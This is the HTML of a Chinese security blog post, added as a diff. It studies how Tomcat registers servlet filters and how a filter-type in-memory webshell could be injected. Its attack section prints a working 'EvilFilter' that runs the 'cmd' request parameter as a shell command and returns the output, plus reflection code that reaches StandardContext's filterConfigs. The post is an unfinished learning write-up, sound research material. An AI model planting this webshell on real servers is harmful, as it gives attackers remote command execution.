@@ -1,0 +1,1361 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="stoocea">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/post/内存马-tomcat类全类型测试学习.html"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="测试前的小补充Servlet API提供的动态注册机制,2013就发布了这一项特性的使用方法serlvet,listener,filter是由javax.servlet.ServletContext去加载的,不论你是XML配置文件还是Annotation注解去配置,都是由web容器进行初始化,读取其中的配置信息,然后在容器中注册(context本身就包含当前web容器中的各项配置信息) servl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tomcat内存马学习（未完全）">
+<meta property="og:url" content="http://example.com/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html">
+<meta property="og:site_name" content="stoocea">
+<meta property="og:description" content="测试前的小补充Servlet API提供的动态注册机制,2013就发布了这一项特性的使用方法serlvet,listener,filter是由javax.servlet.ServletContext去加载的,不论你是XML配置文件还是Annotation注解去配置,都是由web容器进行初始化,读取其中的配置信息,然后在容器中注册(context本身就包含当前web容器中的各项配置信息) servl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/1.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/2.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/3.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/4.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/5.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/6.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/7.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/8.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/9.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/10.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/11.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/12.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/13.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/14.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/15.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/16.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/17.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/18.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/19.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/20.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/21.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/22.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/23.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/24.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/25.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/26.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/27.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/28.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/29.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/30.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/31.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/32.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/33.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/34.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/35.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/36.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/37.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/38.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/39.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/40.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/41.png">
+<meta property="og:image" content="https://stoocea.github.io/images/memshell-tomcat-img/42.png">
+<meta property="article:published_time" content="2023-11-23T09:50:51.000Z">
+<meta property="article:modified_time" content="2023-11-23T08:44:05.705Z">
+<meta property="article:author" content="stoocea">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://stoocea.github.io/images/memshell-tomcat-img/1.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://stoocea.github.io/images/rj3.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://stoocea.github.io/images/rj3.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://stoocea.github.io/images/rj3.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            tomcat内存马学习（未完全） -
+        
+        stoocea blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"stoocea blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                stoocea blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">tomcat内存马学习（未完全）</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="https://stoocea.github.io/images/rj3.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">stoocea</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-11-23 17:50:51</span>
+        <span class="mobile">2023-11-23 17:50:51</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-23 16:44:05</span>
+            <span class="mobile">2023-11-23 16:44:05</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="测试前的小补充"><a href="#测试前的小补充" class="headerlink" title="测试前的小补充"></a>测试前的小补充</h2><p>Servlet API提供的动态注册机制,2013就发布了这一项特性的使用方法<br>serlvet,listener,filter是由javax.servlet.ServletContext去加载的,不论你是XML配置文件还是Annotation注解去配置,都是由web容器进行初始化,读取其中的配置信息,然后在容器中注册(context本身就包含当前web容器中的各项配置信息)</p>
+<p>servlet 3.0 API允许用ServletContext用动态进行注册,并在web容器初始化的时候进行动态注册<br>具体实现的方法可以看ServletContext类中的add*&#x2F;create* 等方法</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/1.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/2.png"><br>当然这里只是指Tomcat为例,其他中间件在代码中有部分实现不同</p>
+<h2 id="Filter型内存马"><a href="#Filter型内存马" class="headerlink" title="Filter型内存马"></a>Filter型内存马</h2><p>Filter过滤器是java中最常见的技术之一,主要是被用来处理静态web资源,访问权限控制,记录日志等附件功能.<br>一次请求进入服务器之后,会先经过filter对用户请求进行预处理,再给servlet处理(类比go gin框架中的中间件)</p>
+<h3 id="FIlter注册方式"><a href="#FIlter注册方式" class="headerlink" title="FIlter注册方式"></a>FIlter注册方式</h3><p>通常情况下,filter配置在配置文件和注解中,如果想要在其他代码中注册,主要通过以下几种方式</p>
+<ol>
+<li>使用ServletContext的addFilter&#x2F;createFilter方法进行注册</li>
+<li>使用servletContextListener的contextInitialized方法在服务器启动时注册</li>
+<li>使用servletContainerInitializer的onStarup方法在初始化时进行注册(非动态)<br>这里我们只讨论ServletContext(虽说后两种注册方法也会在后续学到就是了)</li>
+</ol>
+<h3 id="filter注册探索"><a href="#filter注册探索" class="headerlink" title="filter注册探索"></a>filter注册探索</h3><h4 id="addfilter的探索"><a href="#addfilter的探索" class="headerlink" title="addfilter的探索"></a>addfilter的探索</h4><p>首先先看createFilter方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/3.png"></p>
+<p>在类中注释里看到了它的作用,”用在调用addFilter()方法时向ServletContext实例化一个指定到filter类”,也就是说,在我们调用addFilter()方法的目的是为了创建一个新的filter,而它的实现就是createFilter方法负责给 ServletContext实例化一个指定的filter类</p>
+<p>注释中还写到说,如果这个ServletContext传递给ServletContextListener的ServletContextListener.contextInitialized 方法没有在web.xml中或者web-fragment.xml中声明，而且也没有用注解javax.servlet.annotation.WebListener的话，则会抛出UnsupportedOperationException 异常。这个描述我们之后会遇到</p>
+<p>接下来看addFilter方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/4.png"><br>总计三个，三个的接收参数其实都差不多，FilterName，Filter对象&#x2F;className字符串&#x2F;Filter子类的class对象，提供了不同场景下添加filter的功能，返回均是FilterRegistration.Dynamic，实际上就是FilterRegistration对象</p>
+<p>之前tomcat基础的时候我们学习到三种context，ServletContext其实是一个接口，它的具体实现类是ApplicationContext，那我们接下来就看看具体实现类中的addFilter方法<br>（这里图用的是SU18大佬的图，我自己的idea看着很闹心）此时Tomcat版本为 7.0.96<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/5.png"></p>
+<p>这个方法在判断filtername是否为空，以及context的state是否为程序刚启动的state之后，就调用StandardContext的addfilterDef方法，根据filtername来创建一个新的filter，当然这里的创建方法实际上是在判断context中是否有filtername对应的Filter存在。<br>之后判断这个filterDef是否为空，如果为空，说明这个filter是新的filter，逻辑开始实例化一个新的FilterDef，并将filtername置放进去，之后将新创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中<br>由于此时我们的传进来的filter肯定是null，所以之后调用完 filterDef.setFilterClass之后直接就new了一个ApplicationFilterRegistration返回，并没有将我们指定加载的filter对象存入FilterChain，单纯只调用这个addfilter肯定是不能完成自定filter的注册的，而且在刚开始的时候添加了一个状态标记，如果此时程序处于运行状态就不给我们添加filter了.</p>
+<p>这个时候返回去想能不能直接操控FilterChain?</p>
+<h4 id="Filterchain探索"><a href="#Filterchain探索" class="headerlink" title="Filterchain探索"></a>Filterchain探索</h4><p>FilterChain在tomcat中的实现是<br><code>org.apache.catalina.core.ApplicationFilterChain</code> 这个类确实提供了一个addFilter方法添加filter，该方法接受一个ApplicationFilterConfig对象，然后将其放在this.filters中，看上去很行，但由于每次请求需要执行的FilterChain都是动态获取的，所以这条路也不好走。</p>
+<p>我们重新捋一遍Tomcat是如何处理一次请求对应的FilterChain的，在ApplicationFilterFactory的createFilterChain方法中，大致流程如下：</p>
+<ol>
+<li>在context中获取到filterMaps，并且遍历匹配URL地址和请求是否匹配</li>
+<li>如果匹配，则在context中根据filterMaps中的filterName查找对应的filterConfig</li>
+<li>找到filterConfig之后就将其加入到filterChain中</li>
+<li>后续循环filterChain中的全部filterConfig，通过getFilter方法获取filter，并执行各filter中的dofilter方法</li>
+</ol>
+<p>通过上述流程我们能够知道每次请求的filterChain都是动态匹配和生成的，如果想要添加一个filter，就必须往StandardContext中的filterMaps（至少得让程序知道你这存在这么一个filter）添加键值对，且filterConfigs 中添加 ApplicationFilterConfig（保证能获取到filter的配置信息），这样程序在创建时就能够找到添加的filter了</p>
+<p>上一小节的addfilter中完成了对filter初始化，并存在了StandardContext的filterDefs中（走到逻辑的context.addfilterDef时添加的）<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/6.png"></p>
+<p>那我们这个filterDefs是怎么配置到其他参数（filterMaps与filterConfigs）中的呢？</p>
+<p>在StandardContext的filterStart方法生成了filterConfigs<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/7.png"></p>
+<p>而在ApplicationFilterRegistration的addMappingForUrlPatterns方法生成了filterMaps<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/8.png"></p>
+<p>发现这两者信息都是从filterDefs中获取的</p>
+<p>整理上述逻辑之后，我们理一下在应用程序中动态添加一个filter的条件和思路：</p>
+<ul>
+<li>首先肯定要创建好filterDefs，为此必须调用 ApplicationContext 的 addFilter 方法，而我们在添加新filterDef之前要经过一个状态检查，正在运行的程序是不能添加新filter的，所以要用反射给他改一下表示运行状态的参数，改完之后肯定还要改回来</li>
+<li>调用StandardContext 的 filterStart 方法生成 filterConfigs</li>
+<li>调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps</li>
+<li>为了保证不出现意外状况，我们将恶意filter放在filterMaps的第一位，可以自己修改HashMap中的顺序，也可以自己调用StandardContext中的addFilterMapBefore方法直接放到filterMaps的第一位</li>
+</ul>
+<p>基于以上思路，开始实现流程</p>
+<h3 id="实现前的流程分析"><a href="#实现前的流程分析" class="headerlink" title="实现前的流程分析"></a>实现前的流程分析</h3><p>首先先构建一个servlet项目<br>项目结构如下<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/9.png"><br>这里记得filter建在java目录下<br>然后就是各文件内容 （servlet就不看了)<br>filter</p>
+<pre><code class="java">import javax.servlet.*;  
+import java.io.IOException;  
+  
+  
+  
+public class filter implements Filter &#123;  
+@Override  
+public void init(FilterConfig filterConfig) throws ServletException &#123;  
+System.out.println(&quot;filter初始化完成&quot;);  
+&#125;  
+  
+@Override  
+public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;  
+System.out.println(&quot;执行了dofilter方法&quot;);  
+filterChain.doFilter(servletRequest,servletResponse);  
+&#125;  
+  
+@Override  
+public void destroy() &#123;  
+  
+&#125;  
+&#125;
+</code></pre>
+<p>web.xml</p>
+<pre><code class="xml">
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  
+&lt;web-app xmlns=&quot;https://jakarta.ee/xml/ns/jakartaee&quot;  
+xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  
+xsi:schemaLocation=&quot;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_5_0.xsd&quot;  
+version=&quot;5.0&quot;&gt;  
+  
+&lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  
+&lt;filter-class&gt;filter&lt;/filter-class&gt;  
+&lt;/filter&gt;  
+&lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  
+&lt;url-pattern&gt;/filter&lt;/url-pattern&gt;  
+&lt;/filter-mapping&gt;  
+&lt;/web-app&gt;
+</code></pre>
+<p>之后运行tomcat<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/10.png"></p>
+<p>有的师傅是在分析dofilter()之前，有的是在分析dofilter()之后的流程</p>
+<h4 id="dofilter之后"><a href="#dofilter之后" class="headerlink" title="dofilter之后"></a>dofilter之后</h4><p>这里我们都分析一遍（Drunkbaby师傅的流程）</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/11.png"></p>
+<p>然后单步跟进，直接来到了ApplicationFilterChain类dofilter方法的最后部分–internalDoFilter()方法，在此之前的部分是在进行全局安全服务是否开启的判断<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/12.png"></p>
+<p>然后继续跟进<br>这里看到了熟悉的filterConfig，我们之前分析过，filterConfig最终是从StandardContext的filterStart方法生成的，这里就按住不表了，知道就好</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/13.png"><br>这里的filters有两个，一个是系统自带的filter(0)，一个是我们自己创建的(1)<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/14.png"><br>之后的流程filter循环遍历各个filter的dofilter方法了<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/15.png"></p>
+<p>到最后一个filter的时候就会调用servlet.service方法了，这里跟我们之前学的filter的生命周期代码调试的实现（源码没下下来，导致调试出现了一些错误）是一致的<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/16.png"></p>
+<p>dofilter之后的内容总结一下，根据filterConfig来加载filter，然后filterchain循环遍历filter的dofilter方法调用，在最后一个filter的dofilter方法被调用之后，才调用servlet的service方法</p>
+<h4 id="访问dofilter之前"><a href="#访问dofilter之前" class="headerlink" title="访问dofilter之前"></a>访问dofilter之前</h4><p>分析dofilter之前的内容是为了弄懂我们该从哪下手将我们的filter写入进去，也就是找到filter是如何被创建的</p>
+<p>我们刚才的调试界面<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/17.png"></p>
+<p>前面这一串都是在创建filter，虽然大部分都是是invoke在调用，但我们之前也分析过了filter的几个注册方式，addfilter以及createfilter等。<br>invoke之前的流程就不说了，对我们分析filter的流程没影响，tomcat的service容器中connector处理的过程<br>我们直接到StandardEngineValue的invoke方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/18.png"></p>
+<p>再跟进发现来到AbstractAccesLogValue类的invoke方法<br>发现接下来就是循环调用了<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/19.png"></p>
+<p>我们来到最后一个invoke，也就是StandardWrapperValue类的invoke方法</p>
+<p>在这里执行了一段createFilterChain的方法，继续跟进<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/20.png"></p>
+<p>我们直接跳到最后两端for这里，前面filterChain对象创建好之后开始调用addfilter方法，到addfilter就是我们之前分析filter注册的地方了</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/21.png"></p>
+<h4 id="接上流程的addfilter"><a href="#接上流程的addfilter" class="headerlink" title="接上流程的addfilter"></a>接上流程的addfilter</h4><p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/22.png"><br>根据前面的分析 addfilter在执行最开始会进行一个判断，也就是我们当前程序是否在运行，如果在运行就不给我们追加filter了<br>addfilter这个方法的主要作用是为了创建一个我们恶意filter的filterDef，因为最终filterMaps和filterConfig的内容都是从filterDef来的，所以我们考虑在addfilter这里用反射改一下运行状态参数，先创建好filterDef之后再改回去就行</p>
+<p>然后就是</p>
+<blockquote>
+<p>1.StandardContext 的 filterStart 方法生成 filterConfigs<br>2.调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps<br>3.为了保证不出现意外状况，我们将恶意filter放在filterMaps的第一位，可以自己修改  4.HashMap中的顺序，也可以自己调用StandardContext中的addFilterMapBefore方法直接放到filterMaps的第一位</p>
+</blockquote>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>抓住一个点吧，不论是filtermapping还是filterConfigs都是来自于StndardContext<br>它里面的三个变量<br>filterConMaps：包含所有过滤器和URL映射的关系<br>filterDefs:包含所有过滤器以及内部变量<br>filterConfigs：包含所有与filter对应的filterDef信息以及filter实例<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/23.png"></p>
+<p>我们最终加载filter是根据filterConfigs里面的信息进行添加的，所以这里需要着重说一下filterConfigs</p>
+<p>filterConfigs的成员变量是一个HashMap对象，这里的键和值分别是什么呢？<br>键是filter名称，值是对应的ApplicationFilterConfig。<br>而ApplicationFilterConfig对象里面则存储了filter实例；该实例在web.xml中注册信息（filterDef）；以及ServletContext</p>
+<p>所以要构造出内存马，就必须满足filterConfigs的成员变量<br>现在开始正式写EXP，整体思路是：先获取standContext，然后获取我们的filter，再设置filterDef以及filterMaps<br>首先先把恶意filter写一下</p>
+<pre><code class="java">import javax.servlet.*;  
+import javax.servlet.annotation.WebFilter;  
+import javax.servlet.annotation.WebServlet;  
+import javax.servlet.http.HttpServletRequest;  
+import javax.servlet.http.HttpServletResponse;  
+  
+import java.io.IOException;  
+import java.io.InputStream;  
+import java.util.Scanner;  
+  
+  
+public class EvilFilter implements Filter &#123;  
+public void destroy() &#123;  
+&#125;  
+  
+public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123;  
+HttpServletRequest req = (HttpServletRequest) request;  
+HttpServletResponse resp = (HttpServletResponse) response;  
+if (req.getParameter(&quot;cmd&quot;) != null) &#123;  
+boolean isLinux = true;  
+String osTyp = System.getProperty(&quot;os.name&quot;);  
+if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;  
+isLinux = false;  
+&#125;  
+String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, req.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, req.getParameter(&quot;cmd&quot;)&#125;;  
+InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
+Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);  
+String output = s.hasNext() ? s.next() : &quot;&quot;;  
+resp.getWriter().write(output);  
+resp.getWriter().flush();  
+&#125;  
+chain.doFilter(request, response);  
+&#125;  
+  
+public void init(FilterConfig config) throws ServletException &#123;  
+  
+&#125;  
+  
+&#125;
+</code></pre>
+<p>然后写一个servlet路由，待会访问这个路由就能够将我们的恶意filter注入了</p>
+<p>在看整体的EXP之前呢，我们整体拆分成几个部分来分析，要获取到filterConfigs，就首先得想办法获取到standardcontext类。反射调用即可</p>
+<pre><code class="java">ServletContext servletContext = request.getSession().getServletContext();  
+Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);  
+appctx.setAccessible(true);  
+ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
+  
+Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);  
+stdctx.setAccessible(true);  
+StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+</code></pre>
+<p>这部分得循环调用才能到standardcontext</p>
+<p>之后的话就是正常的获取了，standardcontext中的filterconfigs</p>
+<pre><code class="java">String FilterName = &quot;cmd_Filter&quot;;  
+Field configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);  
+configs.setAccessible(true);  
+filterConfigs = (Map) Configs.get(standardContext);
+</code></pre>
+<p>然后就是将恶意类复制过来就行，或者将其字节码文件base64一下传递过来也行，代码演示就不贴了，后续会有完整的EXP</p>
